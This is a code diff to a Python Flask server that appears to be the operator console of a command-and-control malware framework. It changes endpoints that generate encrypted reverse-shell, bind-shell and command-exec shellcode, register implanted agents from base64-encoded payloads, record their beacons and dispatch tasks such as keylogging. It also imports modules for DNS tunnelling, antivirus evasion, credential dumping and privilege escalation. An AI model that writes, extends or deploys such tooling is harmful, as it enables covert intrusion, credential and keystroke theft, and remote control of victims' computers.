@@ -6,20 +6,18 @@ import time
 import json
 import base64
 import logging
-import socket
-import uuid
-import random
 from datetime import datetime
 import threading
 
-# Add the parent directory to the Python path
+from flask import Flask, render_template, request, jsonify
+
+# Add parent directory to Python path
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from flask import Flask, render_template, request, jsonify
 from modules.shellcode_generator import ShellcodeGenerator
 from modules.dns_tunnel import DNSTunnel
 
-# Only import Windows-specific modules if running on Windows
+# Windows-only modules
 IS_WINDOWS = platform.system().lower() == "windows"
 if IS_WINDOWS:
     from modules.evasion import Evasion
@@ -30,11 +28,14 @@ if IS_WINDOWS:
     from modules.priv_esc import PrivilegeEscalation
     from modules.post_exploit import PostExploit
 
+# Setup logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
 app = Flask(__name__)
 
-# Initialize global instances
+# Global components
 shellcode_gen = ShellcodeGenerator()
-dns_tunnel = DNSTunnel("example.com")  # Replace with actual domain
+dns_tunnel = DNSTunnel("example.com")  # Replace domain if needed
 
 if IS_WINDOWS:
     evasion = Evasion()
@@ -45,7 +46,7 @@ if IS_WINDOWS:
     cred_dump = CredentialDump()
     priv_esc = PrivilegeEscalation()
 
-# Agent/task/result storage
+# Storage
 agents = {}
 tasks = {}
 results = {}
@@ -61,10 +62,7 @@ def shellcode():
 @app.route('/api/generate_shellcode', methods=['POST'])
 def generate_shellcode():
     try:
-        print("[*] Received POST to /api/generate_shellcode")
         data = request.get_json()
-        print("Payload:", data)
-
         shellcode_type = data.get('type')
         platform = data.get('platform', 'windows')
         encoding = data.get('encoding', 'base64')
@@ -74,36 +72,21 @@ def generate_shellcode():
 
         if shellcode_type == 'reverse':
             host = data.get('host')
-            port = data.get('port')
-
+            port = int(data.get('port', 0))
             if not host or not port:
-                return jsonify({'error': 'Host and port are required for reverse shell'}), 400
-
-            try:
-                port = int(port)
-            except ValueError:
-                return jsonify({'error': 'Port must be a number'}), 400
-
+                return jsonify({'error': 'Host and port required'}), 400
             shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)
 
         elif shellcode_type == 'bind':
-            port = data.get('port')
-
+            port = int(data.get('port', 0))
             if not port:
-                return jsonify({'error': 'Port is required for bind shell'}), 400
-
-            try:
-                port = int(port)
-            except ValueError:
-                return jsonify({'error': 'Port must be a number'}), 400
-
+                return jsonify({'error': 'Port required'}), 400
             shellcode = shellcode_gen.generate_bind_shell(port, platform)
 
         elif shellcode_type == 'exec':
             command = data.get('command')
             if not command:
-                return jsonify({'error': 'Command is required for exec shellcode'}), 400
-
+                return jsonify({'error': 'Command required'}), 400
             shellcode = shellcode_gen.generate_exec(command, platform)
 
         else:
@@ -112,40 +95,94 @@ def generate_shellcode():
         if shellcode is None:
             return jsonify({'error': 'Shellcode generation failed'}), 500
 
-        # Apply encryption if selected
-        if encryption != 'none':
-            if encryption == 'xor':
-                shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
-            elif encryption == 'aes':
-                shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")
+        if encryption == 'xor':
+            shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
+        elif encryption == 'aes':
+            shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")
 
-        # Encode for output
-        encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
-        if encoded_shellcode is None:
-            return jsonify({'error': 'Shellcode encoding failed'}), 500
+        encoded = shellcode_gen.encode_shellcode(shellcode, encoding)
+        if encoded is None:
+            return jsonify({'error': 'Encoding failed'}), 500
 
         return jsonify({
             'success': True,
-            'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode
+            'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded
         })
 
     except Exception as e:
-        import traceback
-        traceback.print_exc()
-        return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500
+        return jsonify({'error': f'Unexpected error: {str(e)}'}), 500
 
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
-    return jsonify(list(agents.values()))
+    displayed_agents = []
+    for agent_id, data in agents.items():
+        display_data = data.copy()
+        try:
+            display_data['last_seen'] = datetime.fromisoformat(data['last_seen']).strftime("%m/%d/%Y, %I:%M:%S %p")
+        except:
+            display_data['last_seen'] = "Unknown"
+        displayed_agents.append(display_data)
+    return jsonify(displayed_agents)
 
 @app.route('/api/agents/register', methods=['POST'])
 def register_agent():
-    data = request.get_json()
-    agent_id = data.get('agent_id')
-    if agent_id:
-        agents[agent_id] = data
-        return jsonify({'status': 'success'})
-    return jsonify({'status': 'error'}), 400
+    try:
+        wrapper = request.get_json()
+        encoded_data = wrapper.get('data')
+
+        if not encoded_data:
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
+
+        decoded_json = base64.b64decode(encoded_data).decode()
+        data = json.loads(decoded_json)
+
+        agent_id = data.get('agent_id')
+        if agent_id:
+            agents[agent_id] = data
+            agents[agent_id]['last_seen'] = datetime.now().isoformat()
+            logging.info(f"Registered agent: {agent_id}")
+            return jsonify({'status': 'success'})
+
+        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400
+
+    except Exception as e:
+        logging.error(f"Registration error: {str(e)}")
+        return jsonify({'status': 'error'}), 500
+
+@app.route('/api/agents/beacon', methods=['POST'])
+def agent_beacon():
+    try:
+        wrapper = request.get_json()
+        encoded_data = wrapper.get('data')
+
+        if not encoded_data:
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
+
+        decoded_json = base64.b64decode(encoded_data).decode()
+        data = json.loads(decoded_json)
+
+        agent_id = data.get('agent_id')
+        timestamp = datetime.now().isoformat()
+
+        if agent_id:
+            if agent_id in agents:
+                agents[agent_id]['last_seen'] = timestamp
+            else:
+                agents[agent_id] = {
+                    'agent_id': agent_id,
+                    'system_info': data.get('system_info'),
+                    'status': data.get('status'),
+                    'last_seen': timestamp
+                }
+
+            logging.info(f"Beacon received from {agent_id}")
+            return jsonify({'status': 'ok', 'message': 'Beacon received'})
+
+        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400
+
+    except Exception as e:
+        logging.error(f"Beacon error: {str(e)}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/tasks/<agent_id>', methods=['GET'])
 def get_tasks(agent_id):
@@ -186,7 +223,6 @@ def create_task():
 def execute_task(agent_id, task_id, task_type, task_data):
     try:
         result = None
-
         if IS_WINDOWS:
             if task_type == 'keylogger':
                 result = keylogger.start()
@@ -215,7 +251,7 @@ def execute_task(agent_id, task_id, task_type, task_data):
             }
 
     except Exception as e:
-        logging.error(f"Error executing task: {str(e)}")
+        logging.error(f"Task error: {str(e)}")
         results[task_id] = {
             'agent_id': agent_id,
             'error': str(e),
